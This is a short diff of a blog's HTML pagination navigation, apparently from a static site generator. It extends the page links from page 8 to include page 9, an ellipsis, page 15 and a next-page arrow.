-    <a class="extend prev" rel="prev" href="/page/7/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span>
+    <a class="extend prev" rel="prev" href="/page/7/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/9/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 </div>
